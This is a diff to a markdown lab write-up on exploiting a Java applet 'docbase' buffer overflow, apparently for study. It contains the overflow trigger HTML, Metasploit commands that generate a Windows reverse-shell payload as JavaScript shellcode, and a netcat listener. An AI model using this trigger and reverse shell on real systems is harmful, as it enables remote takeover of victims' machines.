@@ -9,7 +9,7 @@ The vulnerability can be triggered by the following:
 <object type='application/x-java-applet'>
 <param name='launchjnlp' value='1'>
 <param name='docbase' value='AAAAAAAA....AAAAAA'>
-<\object>
+</object>
 ```
 
 ## Goal
@@ -25,17 +25,22 @@ To demonstrate this vulnerability, a simple web server is set up to listen on po
 The shellcode is generated as follows:
 
 `msfconsole`
+
 `use payload/windows/shell_reverse_tcp`
+
 `set LHOST 127.0.0.1`
+
 `set LPORT 6666`
+
 `generate -t js_le`
 
 In the last command, **js_le** was used because a JavaScript shellcode is needed and the Windows machine that is targeted uses Little Endian (le).
 
 3. To accept this reverse TCP connection in Windows, the following netcat command is needed:
+
 `nc -l -p 6666`
 
-*-l* specifies that nc should listen for an incoming connection, and *-p* specifies the source port.
+**-l** specifies that nc should listen for an incoming connection, and **-p** specifies the source port.
 
 4. Windows debugger, WinDBG, is helpful to visualize the stack and heap contents and gather information for the exploit.
 
